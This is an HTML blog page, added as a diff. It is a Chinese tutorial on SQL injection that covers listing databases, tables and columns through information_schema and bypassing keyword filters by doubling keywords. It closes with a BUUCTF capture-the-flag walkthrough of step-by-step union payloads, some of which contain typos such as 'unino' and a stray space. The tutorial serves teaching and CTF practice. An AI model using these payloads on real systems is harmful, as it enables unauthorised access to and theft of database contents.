@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>SQL爆库，表，字段以及双写绕过 | 印星</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="一、SQL爆库，表，字段基础">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL爆库，表，字段以及双写绕过">
+<meta property="og:url" content="http://example.com/2024/10/07/SQL%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97%E6%93%8D%E4%BD%9C/index.html">
+<meta property="og:site_name" content="印星">
+<meta property="og:description" content="一、SQL爆库，表，字段基础">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-10-07T11:21:04.000Z">
+<meta property="article:modified_time" content="2024-10-07T14:13:42.602Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="印星" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">印星</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-SQL爆库表列操作" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/10/07/SQL%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97%E6%93%8D%E4%BD%9C/" class="article-date">
+  <time class="dt-published" datetime="2024-10-07T11:21:04.000Z" itemprop="datePublished">2024-10-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      SQL爆库，表，字段以及双写绕过
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>一、SQL爆库，表，字段基础</p>
+<span id="more"></span>
+<p>1.select<br>在SQL语句中select username from table where id&#x3D;1，这条语句执行的在table表中查询并返回id为1的username数据，那select我们可以理解为查询返回的数据，那select 1这条语句我们则可以简单理解为查询并返回1,在简单的无过滤SQL注入题目中如果只有一个回显result：？，输入提交select 1的话，就会输出result：1</p>
+<p>2.unino<br>unino操作符用于合并两个或多个select语句的结果集，比如unino select 1,2这段语句就会将1,2两个数据作为结果集，分别返回1,2,如果回显为<br>result1:?;result2:?<br>输入提交unino select 1,2的话，就会回显result1：1;result2:2</p>
+<p>3.group_concat()<br>group_concat() 函数将 group by子句产生的同一个分组中的值连接起来，返回一个字符串结果。<br>简单的说，就是该函数传入的变量含有多个值，该函数能将这多个值用逗号隔开，并返回一个字符串</p>
+<p>二、SQL爆库，表，字段原理<br>SQL数据库中有默认库information_schema中，其中包含两个重要表<br>1.information_schema.schemata<br>  schemata表中包含了数据库存在的所有的库名，库名的字段为 schema_name<br>     那如果只有一个回显时，我们就可以输入union select group_concat(schema_name) from information_schema.schemata 查询并返回schemata表中schema_name的所有值。<br>如果有多个回显，我们就可以用数字进行占位nion select 1,2,……,group_concat(schema_name) from information_schema.schemata最后一个回显就会是所有库名了</p>
+<p>2.information_schema.tables<br>  tables表中包含了数据库存在的所有的表名，库名的字段为 table_name,此时爆表要加where<br>  union select group_concat(table_name) from information_schema.tables where table_schema&#x3D;?其中？内填写爆的库名</p>
+<p>3.information_schema.columns<br>  columns表中包含了数据库存在的所有的字段名，库名的字段为 column_name，其他和爆表同理</p>
+<p>知道了以上三种我们就能获得所有库名，表名，和字段名<br>拥有字段名我们就能进行获得想要的各种值了<br>union select group_concat(字段名) from 表名<br>或者union select group_concat(字段名) from 库名.表名</p>
+<p>以上就是爆库，表，列名的基本操作</p>
+<p>三、双写绕过<br>但是在实际注入过程中后端不会轻易的放过你的数据，会用各种规则进行过滤，这时候我们就需要绕过这些过滤规则，这里我先介绍一种比较简单的绕过方式——双写绕过</p>
+<p>原理<br>后端有时候会对一些敏感数据进行一些处理，常见的就像将敏感数据修改为空，比如当判断存在unino时，就将它变为空，解决的方法也很简单，改成ununinoino即可，当unino为空时，前后两段字符刚好组合成union，成功绕过</p>
+<p>四、实战<br>我们选择buuctf中的一道SQL注入题目为例子<br>buuctf：<a target="_blank" rel="noopener" href="https://buuoj.cn/">https://buuoj.cn/</a></p>
+<p>当我们输入1’ union select 1#时，会显示第一行1#附近有语法错误，这时候就是对1#前面的数据进行了过滤，这时候我们双写一下试试1’ ununionion selselectect 1#</p>
+<p>发现双写绕过可行，但是列数不对尝试增加列数，输入1’ ununionion selselectect 1，2,3#</p>
+<p>列数正确为3,且回显示为2和3</p>
+<p>尝试爆库<br>1’ ununionion seselectlect 1,2,group_concat(schema_name) from information_schema.schemata#</p>
+<p>发现还是有过滤显示.schemata#前有information_schema，from过滤，继续尝试双写绕过<br>1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom informainformationtion_schema.schemata#</p>
+<p>发现双写过头了过滤的是or，修改数据<br>1’ ununionion seselectlect 1,2,group_concat(schema_name) frfromom infoorrmation_schema.schemata#</p>
+<p>可以拿到库名，发现ctf很特别，我们爆一下表<br>1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorr mation_schema.tables where table_schema&#x3D;’ctf’#</p>
+<p>发现where过滤，继续双写<br>1’ ununionion seselectlect 1,2,group_concat(table_name) frfromom infoorr mation_schema.tables whwhereere table_schema&#x3D;’ctf’#</p>
+<p>获得表名Flag，继续爆字段</p>
+<p>拿到字段flag，获取内容<br>1’ ununionion seselectlect 1,2,union select group_concat(flag) frfromom ctf.Flag#<br>成功拿到flag</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/10/07/SQL%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97%E6%93%8D%E4%BD%9C/" data-id="cm1z3csle0000m7cpgcgkck0c" data-title="SQL爆库，表，字段以及双写绕过" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2024/10/08/xss%E6%B3%A8%E5%85%A5/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          xss注入
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2024/10/07/SQL%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">SQL注入基础</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/10/">October 2024</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2024/10/08/xss%E6%B3%A8%E5%85%A5/">xss注入</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/07/SQL%E7%88%86%E5%BA%93%E8%A1%A8%E5%88%97%E6%93%8D%E4%BD%9C/">SQL爆库，表，字段以及双写绕过</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/07/SQL%E6%B3%A8%E5%85%A5/">SQL注入基础</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/06/ZoomEye/">ZoomEye</a>
+          </li>
+        
+          <li>
+            <a href="/2024/10/05/%E5%AF%B9%E7%AD%89%E4%BF%9D2-0%E7%9A%84%E7%9C%8B%E6%B3%95/">对等保2.0的看法</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2024 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
